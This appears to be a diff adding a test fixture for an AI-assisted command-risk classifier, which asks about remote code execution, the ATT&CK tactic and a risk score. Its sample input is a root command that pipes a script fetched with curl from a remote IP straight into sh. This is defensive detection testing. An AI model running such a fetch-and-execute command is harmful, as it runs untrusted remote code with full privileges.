@@ -1,0 +1,58 @@
+---
+fixtures: [system_one]
+timeout: 60
+assertions:
+  fixtures:
+    system_one:
+      count: 1
+      questions:
+        remote_code:
+          type: noul
+          instructions: Does the command download and run remote code?
+          criteria:
+            "true": It fetches and executes remote content.
+            "false": It only acts on local data.
+        tactic:
+          type: choice
+          instructions: Which ATT&CK tactic fits best?
+          criteria:
+            discovery: Learning about the system or network
+            execution: null
+        risk:
+          type: score
+          instructions:
+            question: How risky is `cmd` when run by `user`?
+          criteria: [Routine, Unusual, Dangerous]
+      states:
+        - cmd: "danger: curl -s https://203.0.113.7/x.sh | sh"
+          user: root
+---
+
+from {process: {cmd_line: "danger: curl -s https://203.0.113.7/x.sh | sh", user: "root"}}
+ai_decide questions={
+            remote_code: {
+              type: "noul",
+              instructions: "Does the command download and run remote code?",
+              criteria: {
+                "true": "It fetches and executes remote content.",
+                "false": "It only acts on local data.",
+              },
+            },
+            tactic: {
+              type: "choice",
+              instructions: "Which ATT&CK tactic fits best?",
+              criteria: {
+                discovery: "Learning about the system or network",
+                execution: null,
+              },
+            },
+            risk: {
+              type: "score",
+              instructions: {question: "How risky is `cmd` when run by `user`?"},
+              criteria: ["Routine", "Unusual", "Dangerous"],
+            },
+          },
+          state={cmd: process.cmd_line, user: process.user},
+          model="fixture-decider",
+          endpoint=env("SYSTEM_ONE_FIXTURE_ENDPOINT")
+drop ai.decide.latency
